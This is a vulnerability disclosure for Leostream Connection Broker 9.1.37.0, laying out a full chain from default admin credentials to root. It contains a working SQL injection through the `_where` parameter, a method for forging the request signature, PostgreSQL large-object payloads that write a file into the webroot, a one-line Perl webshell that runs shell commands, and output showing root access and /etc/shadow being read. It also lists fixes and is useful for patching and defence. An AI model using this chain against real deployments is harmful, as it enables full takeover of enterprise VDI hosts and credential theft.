# Leostream Connection Broker 9.1.37.0 — Authenticated SQL Injection → lo_export Webshell → sudo Root RCE

## 1. Overview

Leostream Connection Broker is a closed-source VDI connection broker that manages remote-desktop session brokering (PCoIP, RDP) for enterprises. The 9.1.37.0 release runs as a self-contained RPM (Perl 5.32 + Apache mod_perl + PostgreSQL 9.5.25 + Redis). The `call_back.pl?action=user` endpoint concatenates the user-controlled `_where` parameter verbatim into a PostgreSQL SELECT WHERE clause, producing a SQL injection. Because the default installation grants the DB user PostgreSQL SUPERUSER privileges, runs postgres as the webroot owner, and configures NOPASSWD sudo, the injection escalates to arbitrary root command execution.

The `r=digest` request-signing scheme does not cover the `_where` parameter, so the injected SQL does not invalidate the signature. The full chain was verified end-to-end: default login → `_where` injection → `lo_from_bytea` + `lo_export` webshell write → unauthenticated `/welcome.pl?c=` trigger → `sudo` root.

## 2. Vulnerability Summary

- **Type**: Authenticated SQL injection → arbitrary file write → RCE → root privilege escalation
- **Root cause 1 (CWE-89)**: `call_back.pl` splices `$cg->param('_where')` into the WHERE clause without escaping
- **Root cause 2 (CWE-347/CWE-354)**: the `r=digest` signature covers only `^(mb_|action|r|[^=]*[u_]id)` parameters; `_where` is unsigned
- **Root cause 3 (CWE-250/CWE-269)**: `leo` is PostgreSQL SUPERUSER, postgres runs as OS user `leo`, webroot is owned by `leo`, and `leo` has NOPASSWD sudo
- **Result**: default credentials `admin/leo` → SQLi → webshell as `leo` → `sudo` root. CVSS 9.1.

## 3. Authentication Boundary

Authentication is enforced by the Perl session layer (`Security::check`, Security.pm:27), requiring a valid `$st->uid`, a live Redis session (`State::still_around`), and a valid `r=digest` URL parameter. The login flow is:

```
GET index.pl?action=paint → POST (user=admin&password=leo) → 302 license.pl?uid=<UID>;first=1;r=<signed> → follow → Redis session registered
```

`Session::untainted_uid` (Session.pm:415) reads the URL `uid=` parameter (regex `^[A-Za-z][A-Za-z0-9]{28,44}$`) and the `JSESSIONID` cookie. Default credentials `admin/leo` are stored in the DB, displayed on the welcome page, and changeable — classified Target B (authenticated).

The RCE trigger (`/welcome.pl?c=<cmd>`) is itself **unauthenticated** — it is served by mod_perl from the webroot whitelist with no session check, which is what makes the post-injection command execution so direct.

## 4. Attack Surface

- **Entry**: `GET /call_back.pl?action=user&term=a&uid=<UID>&_where=<SQLi>&r=<forged>`
- **Signature bypass**: `_where` does not match the digest regex `^(mb_|action|r|[^=]*[u_]id)`
- **Privilege primitives**: PG SUPERUSER `leo`; postgres runs as OS `leo`; webroot `/home/leo/app` owned by `leo`; `leo ALL=(ALL:ALL) NOPASSWD: ALL`
- **Trigger**: `/welcome.pl?c=<cmd>` — unauthenticated, web-routable

## 5. Sink Identification

`call_back.pl` is routed by httpd.conf FilesMatch (`SetHandler perl-script, PerlResponseHandler ModPerl::RegistryPrefork`) and `call_back` is on the web-routable `.pl` whitelist. The `user` subroutine splices `_where` into the query:

```perl
# pl_call_back.pl user sub (core sink)
my $w = $cg->param('_where');          # user-controlled, no escaping
# ... SELECT ...
# WHERE (("user".name ILIKE 'a%' OR "user".login ILIKE 'a%') AND ($w))
```

The executed SQL (confirmed from the PostgreSQL log):

```sql
SELECT "user".id,"user".name,"user".login
FROM "user"
WHERE (("user".name ILIKE 'a%' OR "user".login ILIKE 'a%') AND (<_where>))
  AND ("user".deleted=0)
ORDER BY "user".login LIMIT 200
```

The `(<_where>)` wrapper is already parenthesis-balanced, so no `--` comment is required. The result is returned as JSON.

## 6. Source Identification & Controllability

The source is the `_where` GET parameter. It is read verbatim (`$cg->param('_where')`) and concatenated into SQL with no escaping.

The signature gate (`libMisc::digest_of_url`, libMisc.pm:398) only digests parameters matching the regex:

```perl
my $digest = sha256_b64(join('!',
    grep { /^(mb_|action|r|[^=]*[u_]id)/ } split(/[;&]/, $url)
) . $digest_secret);
$digest =~ s/[^a-zA-Z0-9_.-]//g;
$digest = substr($digest, 0, $R_DIGEST_LENGTH);   # R_DIGEST_LENGTH=8 (Constants.pm:52)
```

- `_where` does not match the regex → not signed → arbitrary SQL injection does not break `r=digest`.
- `uid=` matches (`[^=]*[u_]id`) → the digest must include the `uid` value.
- `r=<digest><4-digit>`: the server takes the last 4 digits, substitutes `r=last4`, and requires `digest_of_url(modified_url)` to equal the digest prefix.

`digest_secret` is a per-installation random 50-character string stored in the `flag` DB table — readable by the `leo` superuser.

## 7. Data Flow

```
Attacker HTTP request
  GET /call_back.pl?action=user&term=a&uid=<UID>&_where=<SQLi>&r=<forged>
        │
        ├─ Security::check
        │    ├─ untainted_uid: URL uid= (Session.pm:415)
        │    ├─ State::still_around(uid): Redis session exists
        │    └─ r=digest check: digest(action=user&uid=X&r=last4) == prefix
        │        ↑ _where NOT in digest scope → any _where passes
        │
        └─ pl_call_back.pl user sub
             $w = $cg->param('_where')          ← attacker-controlled
             SELECT ... WHERE (... AND ($w))    ← verbatim splice = SINK
                  │
                  └─ PostgreSQL (leo SUPERUSER)
                       lo_from_bytea / lo_export / arbitrary superuser functions
```

## 8. Exploit Construction

### 8.1 Forge `r=digest`

For `action=user&uid=<UID>&r=1234`, the signed parts are `action=user`, `uid=<UID>`, `r=1234`. The digest is:

```
s = "action=user!uid=<UID>!r=1234" + digest_secret
digest = sha256_b64(s), filter to [a-zA-Z0-9_.-], take 8 chars
r = digest + "1234"
```

A pure-stdlib Python implementation (hashlib + base64 + filter) reproduced the Perl `digest.pl` output (`gcioXW5X1234`).

### 8.2 Two-step large-object file write

PostgreSQL large objects write files via `lo_from_bytea(<loid>, decode('<hex>','hex'))` then `lo_export(<loid>,'<path>')`. A single statement `lo_export(lo_from_bytea(0,...),path)` fails because `lo_export` cannot see the uncommitted LO from the same statement (MVCC snapshot isolation). The fix is two requests with a **fixed loid**:

```sql
-- request 1: create LO 99998 (committed at end of transaction)
_where = lo_from_bytea(99998, decode('<webshell_hex>','hex')) IS NOT NULL
-- request 2: export LO to webroot
_where = lo_export(99998,'/home/leo/app/welcome.pl') IS NOT NULL
```

The `IS NOT NULL` wrapper makes the expression a valid boolean WHERE term. `decode(string, format)` takes `decode('<hex>','hex')` — reversed arguments cause "unrecognized encoding".

### 8.3 Webshell payload

```perl
use CGI;my $c=CGI->new->param(qq{c});print qq{Content-type: text/plain\n\n};print qx{$c 2>&1};
```

- No double quotes (would trigger `Database::select` die → HTTP 000)
- No single quotes (safe in the PG string literal)
- `qq{}`/`qx{}` quoting, served by mod_perl `ModPerl::RegistryPrefork`

### 8.4 HTTP 000 as an error oracle

`Database::select` dies on PG error → connection reset → HTTP 000. This is used to detect injection errors (e.g., `lo_from_bytea` errors when the LO already exists → request 1 http=0, but the LO persists → request 2 `lo_export` succeeds).

## 9. Dynamic Verification

Login + SQLi confirmation (container, HTTPS 443):

```
[*] digest self-test -> gcioXW5X1234 (expect gcioXW5X1234) OK
[*] login: True [uid=nOXDS5Qa... license_http=200]
[*] sqli 1=1 -> http=200 body=[{"label":"admin (Administrator)","value":"1"}]
[*] sqli 1=0 -> http=200 body=[{"value":0,"label":"[No users are available for invitations]"}]
```

Webshell write + unauthenticated RCE trigger:

```
[*] lo_from_bytea http=0 ; lo_export http=200
[+] RCE trigger http=200
[+] output:
Content-type: text/plain

uid=1000(leo) gid=1000(leo) groups=1000(leo)
```

Root escalation:

```
$ python3 02-exploit.py https://127.0.0.1:443 id --root
[+] output:
uid=0(root) gid=0(root) groups=0(root)
[+] root escalation via sudo (leo NOPASSWD) - check uid=0 above
```

Additional evidence: `/etc/shadow` readable as root; two-step file-write marker `/tmp/leo_test.txt` (owner `leo`) with content `hello`.

## 10. Reachability & Impact

- **Reachability**: default credentials `admin/leo` (displayed on the welcome page) → admin session; forged `r=digest`; `_where` SQLi; `lo_export` file write; unauthenticated `/welcome.pl?c=` trigger; NOPASSWD sudo. All preconditions hold on a default installation.
- **Impact**: full host compromise as root — broker database, VDI session infrastructure, `/etc/shadow`, arbitrary file read/write, and lateral movement into managed desktop pools.
- **Scope**: enterprise VDI deployments using Leostream Broker.

## 11. Fix Recommendations

1. Parameterize `call_back.pl` queries; forbid raw `_where` concatenation.
2. Extend the `r=digest` signature scope to every user-controllable parameter, or structurally validate `_where`.
3. Drop `leo` to non-superuser with table-scoped privileges; revoke `lo_export`/`lo_from_bytea`.
4. Run postgres as a separate OS user; make the webroot read-only for the DB process.
5. Remove `leo NOPASSWD: ALL`; minimize sudoers.
6. Enforce password change at install; stop displaying the default credential on the welcome page.
7. Harden the webroot (read-only critical `.pl` files + tamper monitoring).

## 12. CWE & CVSS

- **CWE-89**: Improper Neutralization of Special Elements used in an SQL Command (SQL injection)
- **CWE-354**: Improper Validation of Integrity Check Value (`_where` outside `r=digest` scope)
- **CWE-269**: Improper Privilege Management (SUPERUSER + NOPASSWD sudo)
- **CVSS**: 9.1 — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
